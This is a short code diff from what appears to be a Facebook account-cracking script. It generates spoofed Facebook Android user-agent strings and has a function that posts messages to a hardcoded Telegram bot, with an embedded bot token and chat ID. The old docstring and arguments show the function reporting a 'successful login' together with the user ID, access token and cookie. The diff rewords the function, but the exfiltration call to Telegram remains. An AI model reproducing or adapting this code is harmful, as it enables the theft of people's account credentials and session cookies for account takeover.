@@ -17,15 +17,16 @@ def useragent():
     CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
     return CRACK_ua
 
-def handle_telegram_message(c_user, token, cookie):
+def handle_telegram_message(message):
     """
-    Send a message to Telegram about the successful login.
+    Send a formatted message to Telegram.
     """
     bot_token = "7696072927:AAHCieEIUD2UVr5alMwZqyIPhVGjPUqr3KU"  # Replace with your bot token
     chat_id = "7352132358"  # Replace with your chat ID
     telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
-   data = {
+    # Send the request to Telegram
+    data = {
         "chat_id": chat_id,
         "text": message,
         "parse_mode": "HTML"  # Optional: Remove if you don't need HTML parsing
